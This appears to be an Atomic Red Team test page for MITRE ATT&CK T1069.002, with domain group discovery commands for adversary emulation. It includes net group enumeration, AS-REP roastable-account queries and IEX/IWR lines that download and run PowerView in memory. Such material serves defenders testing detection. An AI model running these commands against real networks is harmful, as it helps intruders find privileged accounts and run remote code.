# T1069.002 - Permission Groups Discovery: Domain Groups
Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.

Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Basic Permission Groups Discovery Windows (Domain)
Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
net localgroup
net group /domain
net group "domain admins" /domain
```

Invoke-AtomicTest T1069.002 -TestNumbers 1

### Atomic Test #2 - Permission Groups Discovery PowerShell (Domain)
Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
get-ADPrincipalGroupMembership #{user} | select name
```

Invoke-AtomicTest T1069.002 -TestNumbers 2

### Atomic Test #3 - Elevated group enumeration using net group (Domain)
Runs "net group" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This
test will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
net group /domai "Domain Admins"
net groups "Account Operators" /doma
net groups "Exchange Organization Management" /doma
net group "BUILTIN\Backup Operators" /doma
```

Invoke-AtomicTest T1069.002 -TestNumbers 3

### Atomic Test #4 - Find machines where user has local admin access (PowerView)
Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-LocalAdminAccess -Verbose
```

Invoke-AtomicTest T1069.002 -TestNumbers 4

### Atomic Test #5 - Find local admins on all machines in domain (PowerView)
Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-EnumerateLocalAdmin  -Verbose
```

Invoke-AtomicTest T1069.002 -TestNumbers 5

### Atomic Test #6 - Find Local Admins via Group Policy (PowerView)
takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose```

Invoke-AtomicTest T1069.002 -TestNumbers 6

### Atomic Test #7 - Enumerate Users Not Requiring Pre Auth (ASRepRoast)
When successful, accounts that do not require kerberos pre-auth will be returned

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
```

Invoke-AtomicTest T1069.002 -TestNumbers 7

## Detection
System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).